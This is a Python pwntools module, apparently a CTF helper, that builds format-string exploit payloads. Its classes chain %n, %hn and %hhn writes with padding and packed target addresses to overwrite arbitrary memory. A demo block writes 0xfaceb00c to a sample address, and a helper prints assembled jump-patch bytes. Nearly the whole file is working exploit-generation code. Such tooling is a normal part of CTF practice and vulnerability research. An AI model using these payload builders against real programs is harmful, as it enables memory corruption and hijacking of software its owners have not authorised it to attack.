# -*- coding: utf-8 -*-
#!/usr/bin/env python
#   Version 1.0
#   Author: WildfootW
#   GitHub: github.com/Wildfoot
#   Copyright (C) 2018 WildfootW All rights reserved.
#
from pwn import *

class Error(Exception):
    """
    Base class for exceptions in this module.
    """
    pass

class LengthError(Error):
    """
    Exception raised for your "P_index_forepart_payload_len" is too short for the payload.
    """
    def __init__(self, message):
        self.message = message

class format_s:
    value_now = 0
    payload_string = b""
    def start(self):
        self.value_now = 0
        self.payload_string = b""
        return self

    def ljust(self, size, byte = b'W'):
        if len(self.payload_string) > size:     # ljust is too short
            print()
            raise LengthError("ljust size " + str(size) + " is too short for payload length " + str(len(self.payload_string)) + " now.")
        self.value_now += size - len(self.payload_string)
        self.payload_string = self.payload_string.ljust(size, byte)
        return self

    def append(self, append_s):
        self.value_now += len(append_s)
        self.payload_string += append_s
        return self

    def get(self):
        return self.payload_string

    def s(self, parameter_index):
        self.append((b"%%%d$s" % parameter_index))
        return self

    def n(self, write_value, parameter_index):
        b = 0x100000000
        delta_value = ((write_value - self.value_now) % b + b) % b
        if delta_value == 0:
            self.payload_string += b"%%%d$n" % (parameter_index)
        else:
            self.payload_string += b"%%%dc%%%d$n" % (delta_value, parameter_index)
        self.value_now += delta_value
        return self

    def hhn(self, write_value, parameter_index):
        b = 0x100
        delta_value = ((write_value - self.value_now) % b + b) % b
        if delta_value == 0:
            self.payload_string += b"%%%d$hhn" % (parameter_index)
        else:
            self.payload_string += b"%%%dc%%%d$hhn" % (delta_value, parameter_index)
        self.value_now += delta_value
        return self

    def hn(self, write_value, parameter_index):
        b = 0x10000
        delta_value = ((write_value - self.value_now) % b + b) % b
        if delta_value == 0:
            self.payload_string += b"%%%d$hn" % (parameter_index)
        else:
            self.payload_string += b"%%%dc%%%d$hn" % (delta_value, parameter_index)
        self.value_now += delta_value
        return self

class auto_format_s(format_s):
#    00000000  25 37 30 63  25 31 36 24  68 68 6e 25  31 39 32 63  │%70c│%16$│hhn%│192c│
#    00000010  25 31 37 24  68 68 6e 25  35 38 63 25  31 38 24 68  │%17$│hhn%│58c%│18$h│
#    00000020  68 6e 25 31  39 32 63 25  31 39 24 68  68 6e 25 32  │hn%1│92c%│19$h│hn%2│
#    00000030  30 24 68 68  6e 25 32 31  24 68 68 6e  25 32 32 24  │0$hh│n%21│$hhn│%22$│
#    00000040  68 68 6e 25  32 33 24 68  68 6e 41 41  41 41 41 41  │hhn%│23$h│hnAA│AAAA│
#    00000050  18 10 60 00  00 00 00 00  19 10 60 00  00 00 00 00  │··`·│····│··`·│····│
#    00000060  1a 10 60 00  00 00 00 00  1b 10 60 00  00 00 00 00  │··`·│····│··`·│····│
#    00000070  1c 10 60 00  00 00 00 00  1d 10 60 00  00 00 00 00  │··`·│····│··`·│····│
#    00000080  1e 10 60 00  00 00 00 00  1f 10 60 00  00 00 00 00  │··`·│····│··`·│····│
# in this case P_index_forepart_payload_len = 10

    P_index_begin = 0      # the paramenter index which point to this payload
    P_index_forepart_payload_len = 0       # guess how many bytes you need
    P_index_now = 0                       # how many address have been expected will be saved at the end of payload
    operating_address_size = 0      # usually 8 bytes(x64) or 4 bytes(x86)

    def start(self, operating_address_size = 8, P_index_forepart_payload_len = 1, begin_paramenter = 6):
        format_s.start(self)
        self.P_index_forepart_payload_len = P_index_forepart_payload_len
        self.P_index_begin = begin_paramenter
        self.operating_address_size = operating_address_size
        self.P_index_now = 0
        return self

    def auto_get_P(self, increase_P_index_now = True):
        ret = self.P_index_now + self.P_index_forepart_payload_len + self.P_index_begin
        if increase_P_index_now:
            self.P_index_now += 1
        return ret

    def auto_hhn(self, write_value, times):
        for i in range(times):
            self.hhn(write_value >> (i * 8) & 0xff, self.auto_get_P())
        return self

    def auto_hn(self, write_value, times):
        for i in range(times):
            self.hn(write_value >> (i * 16) & 0xffff, self.auto_get_P())
        return self

    def auto_s(self):
        self.s(self.auto_get_P())
        return self

    def auto_ljust(self, byte = b'W'):
        self.ljust(self.P_index_forepart_payload_len * self.operating_address_size, byte)
        return self

def print_patch(asm_code, byte_amount = 0):
    print(" patch for asm : ".center(60, "="))
    print(asm_code)
    asm_hexcode = asm(asm_code).hex()
    for i in range(byte_amount):
        asm_hexcode += "90"
    asm_hexcode_fix = ""
    for i in range(len(asm_hexcode) // 4):
        asm_hexcode_fix += asm_hexcode[i * 4:i * 4 + 4]
        asm_hexcode_fix += " "
    if len(asm_hexcode) % 4:
        asm_hexcode_fix += asm_hexcode[-2:]
    print(asm_hexcode_fix)
    print("\n    or\n")
    asm_hexcode_fix = asm_hexcode[:2] + " "
    asm_hexcode = asm_hexcode[2:]
    for i in range(len(asm_hexcode) // 4):
        asm_hexcode_fix += asm_hexcode[i * 4:i * 4 + 4]
        asm_hexcode_fix += " "
    if len(asm_hexcode) % 4:
        asm_hexcode_fix += asm_hexcode[-2:]
    print(asm_hexcode_fix)
    print("".center(60, "="))

fmt = format_s()

if __name__ == "__main__":

    def print_payload(payload):
        log.warning("payload: " + str(payload))
        log.warning("payload length: " + str(len(payload)))
        print("\n")

    log.info("Test format_s()")
# usage
    target_address = 0x60106c
    write_value = 0xfaceb00c
    payload = fmt.start().hhn(0xda, 8).ljust(16, b"A").append(p64(target_address)).get()
    print_payload(payload)
    payload = fmt.start().hhn(0xfa, 12).hhn(0xce, 13).hhn(0xb0, 14).hhn(0x0c, 15).ljust((12 - 6) * 8, b"A").append(p64(target_address)).append(p64(target_address + 0x1)).append(p64(target_address + 0x2)).append(p64(target_address + 0x3)).get()
    print_payload(payload)

    log.info("Test auto_format_s()")
#start(self, operating_address_size = 8, P_index_forepart_payload_len = 1, begin_paramenter = 6):
    fmt = auto_format_s()
    fmt.start(operating_address_size = 8,P_index_forepart_payload_len = 19)
    fmt.auto_hhn(write_value, 8).auto_s().auto_hn(write_value, 8).auto_ljust()
    payload = fmt.get()
    print_payload(payload)

    asm_code = """
        mov eax, 0x4007eb
        jmp eax
    """
    print_patch(asm_code, 5)
